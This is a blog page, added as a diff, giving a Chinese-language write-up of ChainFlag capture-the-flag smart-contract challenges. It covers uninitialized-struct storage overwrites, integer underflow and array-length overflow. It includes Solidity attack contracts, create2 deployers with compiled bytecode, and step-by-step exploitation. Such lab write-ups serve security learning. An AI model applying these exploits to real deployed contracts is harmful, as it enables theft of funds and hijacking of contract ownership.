@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="ChainFlag靶场wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ChainFlag靶场实战（一）">
+<meta property="og:url" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="lucifer&#39;s blog">
+<meta property="og:description" content="ChainFlag靶场wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185046188.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185636122.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185707031.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185832657.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229190056040.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229203828847.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229211458581.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229212020475.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101164646144.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101164900221.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101165231284.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101165743683.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101170025288.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101170748746.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101173605905.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101173615363.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102212049614.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102212201082.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102212207919.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102214235376.png">
+<meta property="og:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230102213455415.png">
+<meta property="article:published_time" content="2022-12-29T10:42:20.000Z">
+<meta property="article:modified_time" content="2023-01-02T14:39:19.080Z">
+<meta property="article:author" content="lucifer">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185046188.png">
+
+<link rel="canonical" href="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ChainFlag靶场实战（一） | lucifer's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">lucifer's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a>
+
+  </li>
+        <li class="menu-item menu-item-resources">
+
+    <a href="/resources/" rel="section"><i class="download fa-fw"></i>资源</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="lucifer">
+      <meta itemprop="description" content="知而不行，谓之不诚">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lucifer's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ChainFlag靶场实战（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-29 18:42:20" itemprop="dateCreated datePublished" datetime="2022-12-29T18:42:20+08:00">2022-12-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-01-02 22:39:19" itemprop="dateModified" datetime="2023-01-02T22:39:19+08:00">2023-01-02</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>10 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><a target="_blank" rel="noopener" href="https://chainflag.org/challenges">ChainFlag</a>靶场wp</p>
+ <span id="more"></span>
+
+<h1 id="Storage"><a href="#Storage" class="headerlink" title="Storage"></a>Storage</h1><h2 id="Cow"><a href="#Cow" class="headerlink" title="Cow"></a>Cow</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185046188.png" alt="image-20221229185046188"></p>
+<p>题目要我们发送flag，也就是我们要成为三个owner就能通过这关。</p>
+<p>合约中很明确写出了改变三个owner的方式，分别是Cow,cov和see函数。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185636122.png" alt="image-20221229185636122"></p>
+<p>Cow函数很简单，发送大于1ETH即可。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185707031.png" alt="image-20221229185707031"></p>
+<p>cov函数存在两种情况，一种是发送的eth小于1ether，一种是大于等于1ether，而在大于等于的情况中并没有进行结构体初始化的操作，那么就会出现结构体占位的问题，这个时候的fff.hackeraddress就会占掉owner_2的位置，成功改变了owner_2。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229185832657.png" alt="image-20221229185832657"></p>
+<p>see函数会在我们的地址最后四位为0x525b时给我们的余额减去0xb1b1，如果我们的余额小于这个值就会发生溢出，就能够成功调用buy_own函数完成owner_3的修改，那么就需要用到creat2来构造我们的攻击合约了。</p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">contract deployer&#123;</span><br><span class="line">    bytes attackCode = hex&quot;608060405234801561001057600080fd5b506103c1806100206000396000f3fe60806040526004361061003f5760003560e01c80630f93217d146100445780636760738d1461008857806393af0292146100cc578063fd1a4c2b1461011d575b600080fd5b6100866004803603602081101561005a57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610161565b005b6100ca6004803603602081101561009e57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610225565b005b3480156100d857600080fd5b5061011b600480360360208110156100ef57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610289565b005b61015f6004803603602081101561013357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610328565b005b8073ffffffffffffffffffffffffffffffffffffffff16639ae5a2be346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101a957600080fd5b505af11580156101bd573d6000803e3d6000fd5b50505050508073ffffffffffffffffffffffffffffffffffffffff1663ed6b8ff36040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561020a57600080fd5b505af115801561021e573d6000803e3d6000fd5b5050505050565b8073ffffffffffffffffffffffffffffffffffffffff1663ff2eff94346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561026d57600080fd5b505af1158015610281573d6000803e3d6000fd5b505050505050565b8073ffffffffffffffffffffffffffffffffffffffff16636bc344bc6040518163ffffffff1660e01b81526004018080602001828103825260088152602001807f636f6d706c657465000000000000000000000000000000000000000000000000815250602001915050600060405180830381600087803b15801561030d57600080fd5b505af1158015610321573d6000803e3d6000fd5b5050505050565b8073ffffffffffffffffffffffffffffffffffffffff166396c50336346040518263ffffffff1660e01b81526004016000604051808303818588803b15801561037057600080fd5b505af1158015610384573d6000803e3d6000fd5b50505050505056fea265627a7a72315820dfe5ecf2a26d648964b7392adc412194808763881baf4105ffb577ab07b2947264736f6c63430005110032&quot;;</span><br><span class="line">    function deploy(bytes32 salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">interface cow&#123;</span><br><span class="line">    function Cow()external payable;</span><br><span class="line">    function cov()external payable;</span><br><span class="line">    function see()external payable;</span><br><span class="line">    function buy_own()external;</span><br><span class="line">    function payforflag(string calldata b)external;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    function owner1(address _cow)public payable&#123;</span><br><span class="line">        cow(_cow).Cow.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function owner2(address _cow)public payable&#123;</span><br><span class="line">        cow(_cow).cov.value(msg.value)();</span><br><span class="line">    &#125;</span><br><span class="line">    function owner3(address _cow)public payable&#123;</span><br><span class="line">        cow(_cow).see.value(msg.value)();</span><br><span class="line">        cow(_cow).buy_own();</span><br><span class="line">    &#125;</span><br><span class="line">    function complete(address _cow)public&#123;</span><br><span class="line">        cow(_cow).payforflag(&quot;complete&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>按照分析构造部署合约和攻击合约，一次调用攻击合约的四个函数，即可成功完成攻击。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229190056040.png" alt="image-20221229190056040"></p>
+<h2 id="rise"><a href="#rise" class="headerlink" title="rise"></a>rise</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229203828847.png" alt="image-20221229203828847"></p>
+<p>这关要我们的余额大于1000000.</p>
+<p>看完合约不难发现，airdrop,deposit和risegame可以增加我们的余额，而前两个都只能获得很少的一部分，risegame函数则是根据传入eth的数量和bl的值增加余额。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229211458581.png" alt="image-20221229211458581"></p>
+<p>如果bl的值够大，那么我们就能获得大量的余额，bl值初始为1，想要改变bl的值就需要我们成为referee并调用set_bl函数。合约中貌似并没有让我们成为referee的方法，但容易注意到transferto函数中命名的结构体并没有进行初始化，那么在赋值时hackeraddress就会覆盖referee的值，balance[msg.sender]就会覆盖secret的值。</p>
+<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><p>按照分析的步骤，我们进行攻击：</p>
+<p>1.调用airdrop得到1的余额。</p>
+<p>2.调用transferto函数并传入零地址，把secret修改为我们自己的地址，随后调用set_bl函数把bl改的很大。</p>
+<p>3.调用deposit函数传入1eth，得到一余额。</p>
+<p>4.调用risegame函数传入1和1eth，成功把我们的余额改的很大。</p>
+<p>5.最后调用payforflag即可。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20221229212020475.png" alt="image-20221229212020475"></p>
+<h2 id="roiscoin"><a href="#roiscoin" class="headerlink" title="roiscoin"></a>roiscoin</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101164646144.png" alt="image-20230101164646144"></p>
+<p>这关要求我们调用payforflag函数，需要我们的余额大于2000，并且成为owner。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101164900221.png"></p>
+<p>我们能够第一时间看到合约定义了非常多的变量，并且存在一个元素很多的结构体，后文可以重点关注一下是否能从结构体下手。</p>
+<p>看完合约能够发现一件事情，达到2000余额似乎是个不太难的事情，我们可以通过lockInGuess来存入一个数据，然后调用settle函数时会对这个数字进行判断，根据对应区块的哈希对2取模，我们当然可以全胜，只要等待256个区块让其取不到哈希即可。但我们注意到以下这个else。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101165231284.png" alt="image-20230101165231284"></p>
+<p>也就是说当我们成功获胜两次的时候，如果我们猜错过，就会创建一个结构体放入结构体数组中，很明显能看出来这个结构体没有经过初始化。</p>
+<p>结构体存在七个变量，看似好像能够覆盖到owner，我最初也是这么想的，但随后注意到hash是一个bytes12的数据，而msgsender是一个地址数据，他们会公用一个插槽，刚好占满，也就是说不能覆盖到owner,但codex的长度是我们完全可控的。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101165743683.png" alt="image-20230101165743683"></p>
+<p>在此之外还存在beOwner和revise长度，beOwner是用来骗钱的，只要合约余额大于0，msg.value就永远不可能比address(this).balance大，我最初也被骗了。</p>
+<p>revise函数方便我们设置codex的相应数据。</p>
+<p>联系到revise函数，我们可以想到使codex的长度变得很大，从而发生存储的上溢，覆盖到owner的插槽，再根据revise函数将owner设置为我们。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101170025288.png" alt="image-20230101170025288"></p>
+<p>而想要使codex的长度达到storage的末尾，就需要长度为这么大，转换成十六进制就是</p>
+<p>fc949c7b4a135800000000000000000000000000000000000000000000000000</p>
+<p>而在结构体覆盖中我们的调用者地址会处于三十二字节的前二十个字节，也就是说只要我们地址的前几位大于以上十六进制的前几位就可以使codex长度发生溢出。简而言之就是我们的地址前两位大于fd即可，而要调用revise函数又需要我们的末尾两位为61，所以就需要用到creat2来创建攻击合约进行攻击。</p>
+<h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><p>攻击合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">interface FakeOwnerGame&#123;</span><br><span class="line">    function revise(uint idx, bytes32 tmp)external;</span><br><span class="line">    function lockInGuess(uint8 n) external payable;</span><br><span class="line">    function settle() external;</span><br><span class="line">    function payforflag()external;</span><br><span class="line">&#125;</span><br><span class="line">contract attack&#123;</span><br><span class="line">    FakeOwnerGame roi;</span><br><span class="line">    function setAddr(address _roi)public&#123;</span><br><span class="line">        roi = FakeOwnerGame(_roi);</span><br><span class="line">    &#125;</span><br><span class="line">    function set(uint256 slot,bytes32 value)public&#123;</span><br><span class="line">        roi.revise(slot,value);</span><br><span class="line">    &#125;   </span><br><span class="line">    function guess(uint8 n)public payable&#123;</span><br><span class="line">        roi.lockInGuess.value(msg.value)(n);</span><br><span class="line">    &#125;</span><br><span class="line">    function settle()public&#123;</span><br><span class="line">        roi.settle();</span><br><span class="line">    &#125;</span><br><span class="line">    function complete()public&#123;</span><br><span class="line">        roi.payforflag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>部署合约：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">contract deployer&#123;</span><br><span class="line"></span><br><span class="line">    bytes attackCode = hex&quot;608060405234801561001057600080fd5b506103f0806100206000396000f3fe60806040526004361061004a5760003560e01c806311da60b41461004f5780634ba4c16b14610066578063522e11771461009757806364c4ef1a146100ae578063d1d80fdf146100f3575b600080fd5b34801561005b57600080fd5b50610064610144565b005b6100956004803603602081101561007c57600080fd5b81019080803560ff1690602001909291905050506101c7565b005b3480156100a357600080fd5b506100ac61025d565b005b3480156100ba57600080fd5b506100f1600480360360408110156100d157600080fd5b8101908080359060200190929190803590602001909291905050506102e0565b005b3480156100ff57600080fd5b506101426004803603602081101561011657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610378565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166311da60b46040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156101ad57600080fd5b505af11580156101c1573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632c0e005434836040518363ffffffff1660e01b8152600401808260ff1660ff1681526020019150506000604051808303818588803b15801561024157600080fd5b505af1158015610255573d6000803e3d6000fd5b505050505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166380e10aa56040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156102c657600080fd5b505af11580156102da573d6000803e3d6000fd5b50505050565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630339f30083836040518363ffffffff1660e01b81526004018083815260200182815260200192505050600060405180830381600087803b15801561035c57600080fd5b505af1158015610370573d6000803e3d6000fd5b505050505050565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505056fea265627a7a72315820e4526134fc9de168a1032852b8c6e03a9cbbe4916113978e8c6db60365ac0dd764736f6c63430005110032&quot;;</span><br><span class="line">    function deploy(bytes32 salt) public returns(address)&#123;</span><br><span class="line">        bytes memory bytecode = attackCode;</span><br><span class="line">        address addr;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)</span><br><span class="line">        &#125;</span><br><span class="line">        return addr;</span><br><span class="line">    &#125;</span><br><span class="line">    function getHash()public view returns(bytes32)&#123;</span><br><span class="line">        return keccak256(attackCode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>通过脚本计算出salt并通过creat2部署对应地址的攻击合约．</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101170748746.png" alt="image-20230101170748746"></p>
+<p>随后依次调用setAddr传入roi的地址，guess并传入eth,settle几次直到winCount等于2，set传入覆盖到owner的长度和攻击合约的地址，最后调用complete即可拿回余额成功攻击。</p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101173605905.png" alt="image-20230101173605905"></p>
+<p><img src="/2022/12/29/ChainFlag%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/image-20230101173615363.png" alt="image-20230101173615363"></p>
